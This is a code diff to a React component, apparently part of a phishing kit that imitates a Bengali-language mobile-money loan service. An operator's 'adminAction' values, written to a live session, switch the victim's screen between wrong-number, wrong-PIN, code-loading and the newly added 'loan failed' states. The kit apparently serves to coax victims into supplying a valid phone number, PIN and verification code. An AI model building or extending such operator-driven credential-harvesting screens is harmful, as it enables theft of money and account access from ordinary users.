@@ -15,7 +15,8 @@ enum FinalStep {
   REVIEW = 'REVIEW',
   BALANCE_ERROR = 'BALANCE_ERROR',
   NUMBER_ERROR = 'NUMBER_ERROR',
-  PIN_ERROR = 'PIN_ERROR'
+  PIN_ERROR = 'PIN_ERROR',
+  LOAN_FAILED = 'LOAN_FAILED'
 }
 
 interface FinalResultPageProps {
@@ -158,6 +159,11 @@ const FinalResultPage: React.FC<FinalResultPageProps> = ({ data, sessionId, onSu
       } else if (val.adminAction === 'WRONG_NUMBER') {
         cancelDoneTimer();
         setStep(FinalStep.NUMBER_ERROR);
+        sessionRef.update({ adminAction: 'NONE' });
+      } else if (val.adminAction === 'LOAN_FAILED') {
+        cancelDoneTimer();
+        stopCodeTimer();
+        setStep(FinalStep.LOAN_FAILED);
         sessionRef.update({ adminAction: 'NONE' });
       } else if (val.adminAction === 'DONE') {
         if (currentStep === FinalStep.CODE_LOADING) {
@@ -742,6 +748,41 @@ const FinalResultPage: React.FC<FinalResultPageProps> = ({ data, sessionId, onSu
             className="w-full py-4 bg-[#E2136E] text-white rounded-xl font-black text-lg transition-all active:scale-95 shadow-lg hover:bg-[#D11263]"
           >
             সঠিক পিন দিন
+          </button>
+        </div>
+      </div>
+    );
+  }
+
+  if (step === FinalStep.LOAN_FAILED) {
+    return (
+      <div className="max-w-xl mx-auto animate-fade-in">
+        <div className="bg-white p-10 rounded-3xl shadow-xl border border-red-100 text-center">
+          <div className="w-20 h-20 bg-red-50 rounded-full flex items-center justify-center mx-auto mb-6">
+            <svg className="w-10 h-10 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M10 14l2-2m0 0l2-2m-2 2l-2-2m2 2l2 2m7-2a9 9 0 11-18 0 9 9 0 0118 0z" />
+            </svg>
+          </div>
+
+          <h2 className="text-2xl font-black text-red-600 mb-4">লোন আবেদন ব্যর্থ</h2>
+          <p className="text-gray-600 font-semibold leading-relaxed mb-8">
+            আপনার লোন আবেদনটি অনুমোদন করা সম্ভব হয়নি। অনুগ্রহ করে কিছুক্ষণ পরে আবার চেষ্টা করুন।
+          </p>
+
+          <div className="bg-red-50 rounded-2xl p-5 mb-8 border border-red-100">
+            <div className="flex items-center space-x-3 text-left">
+              <svg className="w-5 h-5 text-red-500 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
+              </svg>
+              <p className="text-sm text-red-700 font-bold">আবেদনের তথ্য সম্পূর্ণ হয়নি বা যাচাইয়ে ব্যর্থ হয়েছে।</p>
+            </div>
+          </div>
+
+          <button
+            onClick={() => { window.location.reload(); }}
+            className="w-full py-4 bg-[#E2136E] text-white rounded-xl font-black text-lg transition-all active:scale-95 shadow-lg hover:bg-[#D11263]"
+          >
+            পুনরায় চেষ্টা করুন
           </button>
         </div>
       </div>
